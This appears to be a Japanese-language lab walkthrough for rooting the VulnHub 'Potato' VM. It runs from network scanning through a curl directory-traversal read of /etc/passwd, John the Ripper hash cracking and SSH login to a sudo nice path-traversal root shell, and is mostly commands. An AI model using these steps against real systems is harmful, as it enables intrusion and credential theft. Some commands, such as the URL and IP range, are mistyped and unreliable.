①自身のアドレスを調べる				
`＄IP△a`				
②PotatoマシンのIPアドレスを特定する				
`$sudo△netdiscover△-i△enp0s3△-r△192,168,56,0/24`				
③IPアドレスを環境変数に設定				
`$export△IP=192.168.56.102`				
④Potatoマシンに疎通確認				
`$ping△$IP`				
⑤実験用のディレクトリの作成				
`$mkdir△vulnhub
$mkdir△vulnhub/potato`				
⑤ポートスキャン				
`$cd△vulnhub/potato/`				
`$sudo△nmap△-sC△-sV△-Pn△-p-△$IP△-oN△portscan_result.txt`				
⑥FTPサービスにアクセス				
`$ftp $IP 2112`				
⑦ダウンロードしたファイルを調べる				
`more△ファイル名`				
⑧HTTPサービスにアクセス※WEBサイトにて				
[`http://192.168.56.102/index.php`](http://192.168.56.102/index.php)				
⑨URLを環境変数に設定				
`$export△URL="http://:80$IP/"`           ※＄IP＝192.168.56.102				
⑩アクセスできるファイルを列挙する				
`$gobuster△dir△-u△$URL△-w△/usr/share/wordlists/dirb/common.txt`				
⑪Burpを使って見る				
※Burp　Suiteのこと				
ParrotOSでは：アプリケーション＞Pentesting＞Web Application Analysis＞Web application Proxies＞Burpsuite CE				
割合				
⑫情報収集を継続する：パスワード解析前にディレクトリラバーサル攻撃で				
etc/passwdファイルのアクセスを試行				
`＄curl△-X△POST△-b△"pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh"△	
-d△'file=../../../../../etc/passwd'△"http://192.168.56.102/admin/dashboard.php?page=log"`				
下線部はBurpのRawで確認できる	
⑫’　NULL文字を改行に置き換えて出力				\はバックスラッシュ
`$cat△/proc/$$/environ△|△tr△'\0'△'\n'`			
⑬パスワードを解析する			パスワードファイルにパスワードハッシュをもつユーザーがいるのでこれを解析	
⑬ー①パスワードハッシュのファイルを作成する				
`$cat△>△pass.txt またはcurl△-X△POST△-b△"pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh"△
-d△'file=../../../../../etc/passwd'△"http://192.168.56.102/admin/dashboard.php?page=log"△>△pass.txt`	
⑬ー②オフラインパスワードクラッカーの力を借りる→John the Ripper				
`$sudo△john△hash.txt△--wordlist=/usr/share/wordlists/rockyou.txt`				
`$sudo△john△hash.txt△-show`				
⑭SSHアクセス				
`$ssh△webadmin@$IP`				
⑮現状把握				
`$id`				
⑯ホームディレクトリを調べる				
`$ls△-la`				
Base64のエンコードの文字列がある場合				
`$cat△user.txt△|△base64△-d`				
⑰/notesディレクトリを調べる				
`$ sudo△/bin/nice△/notes/id.sh`				
⑱niceコマンドでルートシェルを奪取する				
`$ sudo△/bin/nice△/notes/../bin/bash`

EX1				
①OSのバージョンを調べる				
`$ uname -a`
